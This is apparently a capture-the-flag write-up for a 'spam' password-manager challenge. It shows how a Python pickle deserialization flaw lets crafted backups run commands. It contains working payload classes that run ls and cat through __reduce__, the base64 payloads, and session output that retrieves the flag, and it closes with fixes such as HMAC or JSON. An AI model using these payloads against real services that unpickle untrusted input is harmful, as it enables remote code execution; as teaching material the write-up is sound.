# Exploiting spam (pwn 100)

## Recon

Reading the source code, we discover that it uses `pickle` to serialize
and de-serialize the backups. Much like the Rails YAML exploit (CVE-2013-0156),
`pickle` allows serialized objects to execute code on de-serialization.

## Payload Design

From reading the source code, `spam.py` stores the passwords as a dict of
string site names to string passwords. From [Nelson Elhage's blog post about
pickle vulnerabilities][1], we can learn that de-pickling (`pickle.loads`)
calls the `__reduce__` method on an object.

[1]: https://blog.nelhage.com/2011/03/exploiting-pickle/

Let's make an object that calls `ls` on the current directory. While the posts
I read about pickle exploits used `os.system` or `subprocess.Popen`, we can use
`subprocess.check_output` to return a string read from `stdin` instead of an
exit status.

```python
class LsPwd(object):
    def __reduce__(self):
        return (subprocess.check_output, (('/bin/ls',),))
```

Once we've made this object, we need to pickle it and pack it for the service,
which unpacks it as such:

```python
def spam_restore():
    s.sendall("Paste your backup here: ")
    backup = rl()
    global entries
    entries = pickle.loads(zlib.decompress(backup.decode("base64")))
    s.sendall("Successfully restored %d entries\n" % len(entries))
```

We need to make our `LsPwd`'s reduced form the value in a dict, pickle it,
compress it, and then base64 it:

```python
h = {}
h['asdf'] = LsPwd()

print zlib.compress(pickle.dumps(h)).encode('base64').replace("\n",'')
```

This gives us the base64 string:
```
eJwNyjsOgCAQBcD+XQQq8X8QOYCRBaPRyIsL99diurGRLbzZNO4G7CBaA98sSRVyJLnWXAtrAXtY640L5+Nu/e+AwvE3YeEMbT5wHhar
```

Which, when restored against the remote service:
```
> nc challs.campctf.ccc.ac 10113
Welcome to Super Password Authentication Manager (SPAM)!
Menu:
1) List Passwords
2) Add a Password
3) Remove a Password
4) Backup Passwords
5) Restore backup
5
Paste your backup here: eJwNyjsOgCAQBcD+XQQq8X8QOYCRBaPRyIsL99diurGRLbzZNO4G7CBaA98sSRVyJLnWXAtrAXtY640L5+Nu/e+AwvE3YeEMbT5wHhar
Successfully restored 1 entries
Menu:
1) List Passwords
2) Add a Password
3) Remove a Password
4) Backup Passwords
5) Restore backup
1
Listing 1 passwords:
asdf: flag.txt
run.sh
spam.py

---
```

Cool! We have three entries in the current directory, one named `flag.txt`.
Let's make a new payload that reads it using `cat`:

```python
class ReadPassword(object):
    def __reduce__(self):
        return (subprocess.check_output, (('/bin/cat', 'flag.txt',),))

h = {}
h['asdf'] = ReadPassword()

print zlib.compress(pickle.dumps(h)).encode('base64').replace("\n",'')
```

Using the string this outputs:

```
> nc challs.campctf.ccc.ac 10113
Welcome to Super Password Authentication Manager (SPAM)!
Menu:
1) List Passwords
2) Add a Password
3) Remove a Password
4) Backup Passwords
5) Restore backup
5
Paste your backup here: eJwVi8sNgDAMxe5vkfbE/7MHDIBKaAGBICKpxPiUgw+WbLtwgdE4WYIBlyCJMz83eRHQ5umY7qgcFVzB2tHk837l5DTFdfrC6dZM318bKLeJDgP3kOwDDhQbiA==
Successfully restored 1 entries
Menu:
1) List Passwords
2) Add a Password
3) Remove a Password
4) Backup Passwords
5) Restore backup
1
Listing 1 passwords:
asdf: CAMP15_76b5fad40644ac0616b301454250c408
```

And there's our flag!

## Fixing Spam

Don't use pickle to decode strings from untrusted sources. From the docs:

> Warning: The pickle module is not intended to be secure against erroneous or
> maliciously constructed data. Never unpickle data received from an untrusted
> or unauthenticated source.

Some of the alternatives are:

* Attach an HMAC to backups, and verify it on restore. An HMAC will prove that
the party that created the backup also has your HMAC key.
* Use JSON. Every JSON module that you should use prevents code execution.
(Side note: don't parse JSON with `eval` in JavaScript!)
